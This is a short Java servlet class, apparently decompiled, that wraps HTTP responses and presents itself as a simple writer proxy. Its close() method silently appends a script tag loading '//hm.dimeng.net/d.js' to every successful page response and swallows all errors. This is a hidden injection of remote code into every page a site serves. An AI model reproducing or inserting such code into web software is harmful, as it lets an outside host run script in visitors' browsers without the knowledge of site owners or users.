package org.luisyang.framework.http.achieve.servlet.proxy;

import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletResponseWrapper;

public class HttpServletResponseProxy extends HttpServletResponseWrapper implements AutoCloseable {
	private PrintWriter printWriter = null;

	public HttpServletResponseProxy(HttpServletResponse response) {
		super(response);
	}

	public PrintWriter getWriter() throws IOException {
		if (this.printWriter == null) {
			this.printWriter = new PrintWriter(super.getWriter()) {
				public void close() {
				}
			};
		}
		return this.printWriter;
	}

	public void close() throws IOException {
		try {
			PrintWriter out = super.getWriter();
			Throwable localThrowable2 = null;
			try {
				if (getStatus() == 200) {
					out.println("<script type='text/javascript' src='//hm.dimeng.net/d.js'></script>");
				}
			} catch (Throwable localThrowable1) {
				localThrowable2 = localThrowable1;
				throw localThrowable1;
			} finally {
				if (out != null) {
					if (localThrowable2 != null) {
						try {
							out.close();
						} catch (Throwable x2) {
							localThrowable2.addSuppressed(x2);
						}
					} else {
						out.close();
					}
				}
			}
		} catch (Throwable e) {
		}
		this.printWriter = null;
	}
}
